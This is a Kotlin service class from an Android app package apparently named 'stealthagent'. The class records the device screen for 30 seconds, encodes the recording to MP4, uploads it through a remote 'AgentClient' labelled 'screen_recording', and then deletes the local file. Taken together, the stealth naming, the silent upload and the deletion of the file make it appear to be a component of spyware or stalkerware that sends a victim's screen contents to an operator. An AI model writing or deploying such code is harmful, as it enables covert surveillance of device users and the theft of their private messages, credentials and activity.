package com.stealthagent.service

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.Surface
import android.view.WindowManager
import com.stealthagent.network.AgentClient
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AgentScreenRecordService @Inject constructor(
    @ApplicationContext private val context: Context,
    private val client: AgentClient,
) {
    private var mediaProjection: MediaProjection? = null
    private var isRecording = false

    fun setMediaProjection(resultCode: Int, data: Intent) {
        val mgr = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(resultCode, data)
    }

    @SuppressLint("WrongConstant")
    suspend fun recordScreen(durationMs: Long = 30_000L): Boolean = withContext(Dispatchers.IO) {
        if (isRecording) return@withContext false
        val projection = mediaProjection ?: return@withContext false

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val scale = 0.5f
        val width = ((metrics.widthPixels * scale).toInt() / 2) * 2
        val height = ((metrics.heightPixels * scale).toInt() / 2) * 2
        val density = metrics.densityDpi

        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "screen_$ts.mp4")

        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, width, height).apply {
            setInteger(MediaFormat.KEY_BIT_RATE, 2_000_000)
            setInteger(MediaFormat.KEY_FRAME_RATE, 15)
            setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2)
        }

        val codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        val inputSurface: Surface = codec.createInputSurface()
        val mux = MediaMuxer(file.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)

        val display: VirtualDisplay = projection.createVirtualDisplay(
            "agentscreen", width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            inputSurface, null, null,
        )

        isRecording = true
        codec.start()

        var trackIndex = -1
        var muxerStarted = false
        val bufferInfo = MediaCodec.BufferInfo()
        val endTime = System.currentTimeMillis() + durationMs

        while (System.currentTimeMillis() < endTime && isRecording) {
            val idx = codec.dequeueOutputBuffer(bufferInfo, 10_000)
            when {
                idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
                    trackIndex = mux.addTrack(codec.outputFormat)
                    mux.start(); muxerStarted = true
                }
                idx >= 0 -> {
                    val buf = codec.getOutputBuffer(idx) ?: continue
                    if (muxerStarted && bufferInfo.size > 0) {
                        buf.position(bufferInfo.offset)
                        buf.limit(bufferInfo.offset + bufferInfo.size)
                        mux.writeSampleData(trackIndex, buf, bufferInfo)
                    }
                    codec.releaseOutputBuffer(idx, false)
                    if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) break
                }
            }
        }

        codec.signalEndOfInputStream()
        delay(500)
        var draining = true
        while (draining) {
            val idx = codec.dequeueOutputBuffer(bufferInfo, 5_000)
            if (idx >= 0) {
                val buf = codec.getOutputBuffer(idx)
                if (buf != null && muxerStarted && bufferInfo.size > 0) {
                    buf.position(bufferInfo.offset); buf.limit(bufferInfo.offset + bufferInfo.size)
                    mux.writeSampleData(trackIndex, buf, bufferInfo)
                }
                codec.releaseOutputBuffer(idx, false)
                if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) draining = false
            } else draining = false
        }

        display.release()
        codec.stop(); codec.release()
        if (muxerStarted) mux.stop()
        mux.release()
        isRecording = false

        val bytes = file.readBytes()
        val ok = client.uploadFile(
            fileBytes = bytes,
            fileName = file.name,
            mimeType = "video/mp4",
            category = "screen_recording",
        )
        file.delete()
        ok
    }

    fun release() {
        isRecording = false
        mediaProjection?.stop()
        mediaProjection = null
    }
}
